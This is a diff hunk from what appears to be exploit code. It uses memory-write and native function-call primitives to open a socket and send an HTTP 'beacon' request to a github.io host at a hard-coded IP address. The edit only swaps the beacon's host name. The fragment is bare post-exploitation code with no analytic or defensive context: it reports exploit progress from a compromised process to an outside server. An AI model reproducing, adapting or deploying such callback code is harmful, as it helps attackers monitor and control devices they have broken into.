@@ -460,7 +460,7 @@
         uwrite16(_addr + 2n, 0xBB01n); // port 443 big-endian
         uwrite32(_addr + 4n, 0x996CC7B9n); // 185.199.108.153
         if (fcall(_CONNECT, _sock, _addr, 16n) == 0n) {
-          let _req = get_cstring("GET /lightsaber/beacon?s=early HTTP/1.0\r\nHost: zeroxjf.github.io\r\n\r\n");
+          let _req = get_cstring("GET /lightsaber/beacon?s=early HTTP/1.0\r\nHost: 0xjohnnydev.github.io\r\n\r\n");
           fcall(WRITE, _sock, _req, 68n);
         }
         fcall(CLOSE, _sock);
